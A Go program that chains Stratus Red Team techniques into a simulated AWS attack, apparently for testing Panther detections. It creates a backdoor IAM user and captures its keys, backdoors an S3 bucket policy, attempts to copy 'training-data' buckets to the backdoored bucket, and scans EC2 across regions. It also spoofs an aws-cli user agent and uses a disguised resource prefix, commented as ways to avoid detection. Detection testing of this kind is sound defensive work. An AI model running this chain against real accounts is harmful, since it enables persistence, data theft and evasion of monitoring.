package main

import (
	"context"
	"fmt"
	"log"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/smithy-go/middleware"
	smithyhttp "github.com/aws/smithy-go/transport/http"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/useragent"
	"github.com/google/uuid"
)

/*
Multi-stage attack scenario for Panther detection testing:
1. Create backdoor IAM user with access key (persistence)
2. Use backdoor credentials to modify S3 bucket policy (defense evasion)
3. Use backdoor credentials to discover and attempt exfiltration (discovery/exfiltration)
4. Perform EC2 reconnaissance in US regions (discovery)

This simulates a realistic attack chain where an attacker:
- Establishes persistence through IAM
- Modifies S3 permissions for data access
- Attempts to discover and exfiltrate training data
- Performs infrastructure reconnaissance
*/

type BackdoorCredentials struct {
	AccessKeyID     string
	SecretAccessKey string
	UserName        string
}

// createAWSConfigWithBackdoorCredentials creates an AWS config with custom credentials and Stratus user agent
func createAWSConfigWithBackdoorCredentials(accessKeyID, secretAccessKey string, region string) (aws.Config, error) {
	uniqueID := uuid.New()

	// Create custom user agent middleware similar to Stratus
	customUserAgentMiddleware := func(uniqueID uuid.UUID) middleware.BuildMiddleware {
		return middleware.BuildMiddlewareFunc("StratusUserAgent", func(
			ctx context.Context, input middleware.BuildInput, next middleware.BuildHandler,
		) (out middleware.BuildOutput, metadata middleware.Metadata, err error) {
			request, ok := input.Request.(*smithyhttp.Request)
			if !ok {
				return out, metadata, fmt.Errorf("unknown transport type %T", input.Request)
			}
			// Use a realistic AWS CLI user agent to avoid detection
			userAgent := fmt.Sprintf("aws-cli/2.13.25 Python/3.11.5 Linux/5.15.0-84-generic source/x86_64.ubuntu.22.04 prompt/off command/s3.sync")
			request.Header.Set("User-Agent", userAgent)
			return next.HandleBuild(ctx, input)
		})
	}

	options := []func(*config.LoadOptions) error{
		config.WithCredentialsProvider(
			credentials.NewStaticCredentialsProvider(accessKeyID, secretAccessKey, ""),
		),
		config.WithAPIOptions([]func(stack *middleware.Stack) error{
			func(stack *middleware.Stack) error {
				return stack.Build.Add(customUserAgentMiddleware(uniqueID), middleware.After)
			},
		}),
	}

	if region != "" {
		options = append(options, config.WithRegion(region))
	}

	cfg, err := config.LoadDefaultConfig(context.Background(), options...)
	if err != nil {
		return aws.Config{}, fmt.Errorf("unable to load SDK config: %w", err)
	}

	return cfg, nil
}

// Custom prefix for stealth (avoiding "stratus-red-team" branding)
const SCENARIO_PREFIX = "security-audit"

func main() {
	// Set realistic user agent prefix for all stratus techniques to avoid detection
	useragent.SetUserAgentPrefix("aws-cli")

	log.Println("Starting IAM-to-S3 exfiltration scenario...")

	// Stage 1: Create backdoor IAM user and capture credentials
	log.Println("\nStage 1: Creating backdoor IAM user...")
	backdoorCreds, err := createBackdoorUser()
	if err != nil {
		log.Fatal("Failed to create backdoor user: " + err.Error())
	}
	defer cleanupBackdoorUser()

	// Stage 2: Setup S3 bucket with backdoor policy
	log.Println("\nStage 2: Setting up S3 bucket with backdoor policy...")
	bucketName, err := setupS3Backdoor()
	if err != nil {
		log.Fatal("Failed to setup S3 backdoor: " + err.Error())
	}
	defer cleanupS3Backdoor()

	// Allow AWS propagation time
	log.Println("Waiting for AWS IAM/S3 changes to propagate...")
	time.Sleep(10 * time.Second)

	// Stage 3: Use backdoor credentials to discover and attempt exfiltration
	log.Println("\nStage 3: Using backdoor credentials for discovery and attempted exfiltration...")
	err = performDiscoveryAndExfiltration(backdoorCreds, bucketName)
	if err != nil {
		log.Printf("Exfiltration attempts failed (expected): %s", err.Error())
	}

	// Stage 4: Perform EC2 reconnaissance
	log.Println("\nStage 4: Performing EC2 reconnaissance across US regions...")
	err = performEC2Reconnaissance(backdoorCreds)
	if err != nil {
		log.Printf("EC2 reconnaissance failed: %s", err.Error())
	}

	log.Println("\nMulti-stage attack scenario completed successfully!")
	log.Println("Check your Panther logs for the following detections:")
	log.Println("   - IAM CreateAccessKey event")
	log.Println("   - S3 PutBucketPolicy event")
	log.Println("   - S3 ListBuckets discovery operations")
	log.Println("   - S3 Sync operations (failed due to insufficient permissions)")
	log.Println("   - EC2 DescribeInstances across multiple regions")
	log.Println("   - Cross-region reconnaissance patterns")

	log.Println("\nPress Enter to clean up resources...")
	fmt.Scanln()
}

func createBackdoorUser() (*BackdoorCredentials, error) {
	// First clean up any existing technique state to get fresh logs
	log.Println("Cleaning up any existing IAM technique state...")
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.persistence.iam-backdoor-user", "--prefix", SCENARIO_PREFIX)
	cmd.Run() // Ignore errors since technique might not exist

	// Warm up IAM backdoor technique with custom prefix for stealth
	log.Println("Warming up IAM backdoor user technique...")
	cmd = exec.Command("../bin/stratus", "warmup", "aws.persistence.iam-backdoor-user", "--prefix", SCENARIO_PREFIX)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("warmup failed: %w, output: %s", err, string(output))
	}

	// Execute IAM backdoor technique and capture output
	log.Println("Detonating IAM backdoor user...")
	cmd = exec.Command("../bin/stratus", "detonate", "aws.persistence.iam-backdoor-user", "--prefix", SCENARIO_PREFIX)
	output, err = cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("detonation failed: %w, output: %s", err, string(output))
	}

	// Parse the output to extract credentials
	outputStr := string(output)
	log.Println("IAM technique output:", outputStr)

	// Extract Access Key ID
	accessKeyRegex := regexp.MustCompile(`Successfully created access key ([A-Z0-9]+)`)
	accessKeyMatch := accessKeyRegex.FindStringSubmatch(outputStr)
	if len(accessKeyMatch) < 2 {
		return nil, fmt.Errorf("could not find access key in output")
	}

	// Extract Secret Access Key
	secretKeyRegex := regexp.MustCompile(`Secret access key: ([A-Za-z0-9/+=]+)`)
	secretKeyMatch := secretKeyRegex.FindStringSubmatch(outputStr)
	if len(secretKeyMatch) < 2 {
		return nil, fmt.Errorf("could not find secret key in output")
	}

	creds := &BackdoorCredentials{
		AccessKeyID:     accessKeyMatch[1],
		SecretAccessKey: secretKeyMatch[1],
		UserName:        "johnny-appleseed", // This matches our hardcoded name
	}

	log.Printf("Backdoor user created: %s", creds.UserName)
	log.Printf("Captured credentials: %s", creds.AccessKeyID)
	return creds, nil
}

func setupS3Backdoor() (string, error) {
	// First clean up any existing S3 technique state
	log.Println("Cleaning up any existing S3 technique state...")
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.exfiltration.s3-backdoor-bucket-policy", "--force")
	cmd.Run() // Ignore errors

	// Warm up S3 backdoor technique
	log.Println("Warming up S3 backdoor technique...")
	cmd = exec.Command("../bin/stratus", "warmup", "aws.exfiltration.s3-backdoor-bucket-policy")
	warmupOutput, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("S3 warmup failed: %w, output: %s", err, string(warmupOutput))
	}

	log.Printf("S3 warmup output: %s", string(warmupOutput))

	// Execute S3 backdoor technique
	log.Println("Detonating S3 backdoor...")
	cmd = exec.Command("../bin/stratus", "detonate", "aws.exfiltration.s3-backdoor-bucket-policy")
	detonateOutput, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("S3 detonation failed: %w, output: %s", err, string(detonateOutput))
	}

	log.Printf("S3 detonate output: %s", string(detonateOutput))

	// Try to extract bucket name from warmup or detonate output
	combinedOutput := string(warmupOutput) + string(detonateOutput)

	// Look for common bucket name patterns (updated for stealth)
	patterns := []string{
		`security-audit-[a-z0-9-]+`, // Our custom prefix
		`aws-cli-[a-z0-9-]+`,        // If stratus uses our new prefix
		`S3 bucket ([a-z0-9-]+) ready`,
		`bucket ([a-z0-9-]+)`,
		`([a-z]+-[a-z]+-[a-z]+-[a-z0-9]+)`, // Pattern like log-data-ops-txstdcdopm
	}

	for _, pattern := range patterns {
		bucketRegex := regexp.MustCompile(pattern)
		matches := bucketRegex.FindStringSubmatch(combinedOutput)
		if len(matches) > 1 {
			bucketName := matches[1]
			log.Printf("S3 bucket backdoored: %s", bucketName)
			return bucketName, nil
		} else if len(matches) == 1 {
			bucketName := matches[0]
			// Skip if it's just "bucket" or similar
			if len(bucketName) > 6 && strings.Contains(bucketName, "-") {
				log.Printf("S3 bucket backdoored: %s", bucketName)
				return bucketName, nil
			}
		}
	}

	return "", fmt.Errorf("could not find bucket name in output. Warmup: %s, Detonate: %s", string(warmupOutput), string(detonateOutput))
}

func performDiscoveryAndExfiltration(creds *BackdoorCredentials, backdoorBucket string) error {
	log.Printf("Using backdoor credentials: %s", creds.AccessKeyID)

	// Create AWS config with backdoor credentials and custom user agent
	cfg, err := createAWSConfigWithBackdoorCredentials(creds.AccessKeyID, creds.SecretAccessKey, "")
	if err != nil {
		return fmt.Errorf("failed to create AWS config with backdoor credentials: %w", err)
	}

	// Create S3 client with backdoor credentials
	s3Client := s3.NewFromConfig(cfg)

	// Stage 3a: Discover all S3 buckets
	log.Println("Enumerating S3 buckets to find training data...")
	bucketsResult, err := s3Client.ListBuckets(context.Background(), &s3.ListBucketsInput{})
	if err != nil {
		return fmt.Errorf("failed to list S3 buckets: %w", err)
	}

	log.Printf("Found %d buckets in the account:", len(bucketsResult.Buckets))
	var trainingDataBuckets []string
	for _, bucket := range bucketsResult.Buckets {
		bucketName := *bucket.Name
		log.Printf("   - %s", bucketName)

		// Look for buckets containing "training-data"
		if strings.Contains(bucketName, "training-data") {
			trainingDataBuckets = append(trainingDataBuckets, bucketName)
			log.Printf("     POTENTIAL TARGET: Contains 'training-data'")
		}
	}

	// Stage 3b: Attempt to exfiltrate training data buckets
	if len(trainingDataBuckets) == 0 {
		log.Println("No buckets containing 'training-data' found")
		log.Println("Simulating discovery of a theoretical training-data bucket...")
		trainingDataBuckets = append(trainingDataBuckets, "company-ml-training-data-prod")
	}

	for _, targetBucket := range trainingDataBuckets {
		log.Printf("Attempting to sync data from %s to %s...", targetBucket, backdoorBucket)

		// Try to list objects in the target bucket (this will likely fail)
		_, err := s3Client.ListObjectsV2(context.Background(), &s3.ListObjectsV2Input{
			Bucket: &targetBucket,
		})
		if err != nil {
			log.Printf("Cannot access %s: %s", targetBucket, err.Error())
			continue
		}

		// If we could access it, try to sync (this will likely fail due to insufficient permissions)
		log.Printf("Attempting S3 sync operation (will likely fail due to insufficient IAM permissions)")
		err = attemptS3Sync(s3Client, targetBucket, backdoorBucket)
		if err != nil {
			log.Printf("S3 sync failed: %s", err.Error())
		}
	}

	return fmt.Errorf("exfiltration attempts failed due to insufficient permissions (expected behavior)")
}

func attemptS3Sync(s3Client *s3.Client, sourceBucket, destBucket string) error {
	// List a few objects from source
	maxKeys := int32(5)
	result, err := s3Client.ListObjectsV2(context.Background(), &s3.ListObjectsV2Input{
		Bucket:  &sourceBucket,
		MaxKeys: &maxKeys, // Just try a few
	})
	if err != nil {
		return fmt.Errorf("cannot list objects in source bucket: %w", err)
	}

	// Attempt to copy each object
	for _, obj := range result.Contents {
		sourceKey := *obj.Key
		log.Printf("  Attempting to copy: %s", sourceKey)

		// Try to copy object (this should fail)
		copySource := sourceBucket + "/" + sourceKey
		_, err := s3Client.CopyObject(context.Background(), &s3.CopyObjectInput{
			Bucket:     &destBucket,
			Key:        &sourceKey,
			CopySource: &copySource,
		})
		if err != nil {
			return fmt.Errorf("copy object failed: %w", err)
		}
	}

	return nil
}

func performEC2Reconnaissance(creds *BackdoorCredentials) error {
	log.Printf("Starting EC2 reconnaissance across US regions...")

	// US regions to scan
	usRegions := []string{
		"us-east-1", "us-east-2", "us-west-1", "us-west-2",
	}

	totalInstances := 0
	for _, region := range usRegions {
		log.Printf("Scanning region: %s", region)

		// Create region-specific config with backdoor credentials
		cfg, err := createAWSConfigWithBackdoorCredentials(creds.AccessKeyID, creds.SecretAccessKey, region)
		if err != nil {
			log.Printf("  Failed to configure region %s: %s", region, err.Error())
			continue
		}

		// Create EC2 client for this region
		ec2Client := ec2.NewFromConfig(cfg)

		// List running instances
		filterName := "instance-state-name"
		result, err := ec2Client.DescribeInstances(context.Background(), &ec2.DescribeInstancesInput{
			Filters: []types.Filter{
				{
					Name:   &filterName,
					Values: []string{"running"},
				},
			},
		})
		if err != nil {
			log.Printf("  Failed to describe instances in %s: %s", region, err.Error())
			continue
		}

		// Count instances in this region
		regionInstances := 0
		for _, reservation := range result.Reservations {
			regionInstances += len(reservation.Instances)
			for _, instance := range reservation.Instances {
				log.Printf("  Instance: %s (%s)", *instance.InstanceId, string(instance.InstanceType))
			}
		}

		log.Printf("  Found %d running instances in %s", regionInstances, region)
		totalInstances += regionInstances
	}

	log.Printf("EC2 reconnaissance complete: %d total running instances across US regions", totalInstances)
	return nil
}

func cleanupBackdoorUser() {
	log.Println("Cleaning up IAM backdoor user...")
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.persistence.iam-backdoor-user")
	cmd.Run()
}

func cleanupS3Backdoor() {
	log.Println("Cleaning up S3 backdoor...")
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.exfiltration.s3-backdoor-bucket-policy")
	cmd.Run()
}
